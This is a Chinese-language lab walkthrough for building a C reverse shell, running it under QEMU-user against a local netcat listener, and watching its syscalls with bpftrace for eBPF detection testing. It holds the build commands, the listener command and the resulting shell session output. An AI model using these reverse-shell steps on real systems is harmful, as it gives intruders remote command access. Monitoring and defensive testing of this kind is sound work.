现在test里面

进入仓库根目录，运行脚本把你要连接回的 IP/端口写进 `linux.c` 里：

```
cd ~/Program-test/c-reverse-shell
./change_client.sh 127.0.0.1 4444
```

这会把 `CLIENT_IP` 和 `CLIENT_PORT` 宏写到 `linux.c`。

------

## 2. 编译 Linux 版

还是在仓库根目录，直接用 Makefile：

```
make linux
```

完成后，会生成一个叫 `reverse.elf` 的可执行文件。

如果你想跳过脚本、手动编译，也可以这么写：

```
gcc -std=c99 -D_GNU_SOURCE \
    linux.c -o rsh.out \
    -DCLIENT_IP=\"127.0.0.1\" -DCLIENT_PORT=4444
```

------

## 3. 启动监听（Attacker）

在另一个终端里，先启动 netcat 监听端口：

```
nc -lvp 4444
```

------

## 4. 在 QEMU-user 下运行

回到第一个终端，运行：

```

qemu-x86_64 ./reverse.elf
```

（如果你手动编译的是 `rsh.out`，就改成 `qemu-x86_64 ./rsh.out`）

这时程序会 fork 出子进程，子进程会向 `127.0.0.1:4444` 发起 TCP 连接，并把自己的 stdin/stdout/stderr 全部重定向到这个 socket。

------

## 5. 验证反弹 Shell

在你的 nc 窗口里，你应该会看到类似：

```
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 54832
$ whoami
user
$ pwd
/home/user/test/c-reverse-shell
```

如果看到，就说明反向 Shell 成功了。

------

## 6. 同时监控它的系统调用

在另一个终端再开一个 bpftrace 监控脚本（比如你的 `monitor.bt`）：

```
cd ~/test/my_qemu_monitor
sudo ./monitor.bt
```

然后再执行上面的 `qemu-x86_64 ./reverse.elf`。你会实时看到：

```
SOCKET: domain=2 type=1 pid=54832
CONNECT: pid=54832
EXEC: /bin/sh (pid=54832)
```

等等关键调用被捕获。这样就完成了在 WSL2 + QEMU-user + eBPF 环境下，对这个反向 Shell 的端到端测试。